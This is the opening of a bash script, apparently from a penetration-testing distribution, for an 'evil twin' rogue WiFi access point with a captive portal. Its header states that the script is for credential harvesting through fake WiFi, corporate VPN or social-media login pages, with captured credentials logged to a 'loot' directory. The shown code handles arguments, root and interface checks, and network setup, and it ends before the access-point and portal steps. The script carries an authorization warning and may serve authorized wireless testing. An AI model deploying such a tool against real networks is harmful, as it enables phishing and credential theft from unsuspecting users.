#!/bin/bash
set -euo pipefail
# /usr/local/bin/wifi-evil-twin
# Rogue access point with captive portal for credential harvesting
# Creates a fake WiFi network, intercepts DNS, and serves a login page
# Usage: wifi-evil-twin <ap_iface> <inet_iface> <essid> [portal_type]
#
# Portal types:
#   wifi     — Fake "WiFi login" page (default)
#   corporate — Fake "Corporate VPN" page
#   social   — Fake "Social media" page
#   custom   — Serve your own HTML from /opt/cardputer/config/captive/
#
# WARNING: Only use on networks you own or have authorization to test.

AP_IFACE="${1:-wlan0}"
INET_IFACE="${2:-eth0}"
ESSID="${3:-FreeWiFi}"
PORTAL="${4:-wifi}"
LOOT="/opt/cardputer/loot/recon"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

if [ "$(id -u)" -ne 0 ]; then
    echo "[!] Root required."
    exit 1
fi

if [ -z "$ESSID" ]; then
    echo "[!] ESSID cannot be empty"
    exit 1
fi

# Validate ESSID: no newlines or control characters (prevents hostapd config injection)
if ! echo "$ESSID" | grep -qP '^[\x20-\x7e]+$'; then
    echo "[!] ESSID contains invalid characters (newlines/special chars not allowed)"
    exit 1
fi

echo "[*] ZERO-DAY OS — Evil Twin Access Point + Captive Portal"
echo "[*] AP Interface: $AP_IFACE"
echo "[*] Internet Interface: $INET_IFACE"
echo "[*] ESSID: $ESSID"
echo "[*] Portal Type: $PORTAL"
echo ""

if ! ip link show "$AP_IFACE" &>/dev/null; then
    echo "[!] AP interface $AP_IFACE not found."
    echo "[!] If using dual-WiFi, the dongle should be wlan1."
    echo "[!] Try: wifi-evil-twin wlan1 eth0 '$ESSID'"
    exit 1
fi

if ! ip link show "$INET_IFACE" &>/dev/null; then
    echo "[!] Internet interface $INET_IFACE not found."
    echo "[!] Available interfaces:"
    ip -br link show
    exit 1
fi

if iw dev "$AP_IFACE" info 2>/dev/null | grep -q "monitor"; then
    echo "[*] Switching $AP_IFACE to managed mode..."
    ip link set "$AP_IFACE" down
    iw dev "$AP_IFACE" set type managed
    ip link set "$AP_IFACE" up
fi

rfkill unblock wifi 2>/dev/null

AP_IP="10.0.0.1"
AP_DHCP_START="10.0.0.2"
AP_DHCP_END="10.0.0.50"
AP_NETMASK="255.255.255.0"
PORTAL_DIR="/opt/cardputer/config/captive"
CAPTIVE_LOG="$LOOT/captive_creds_${TIMESTAMP}.log"

mkdir -p "$PORTAL_DIR"

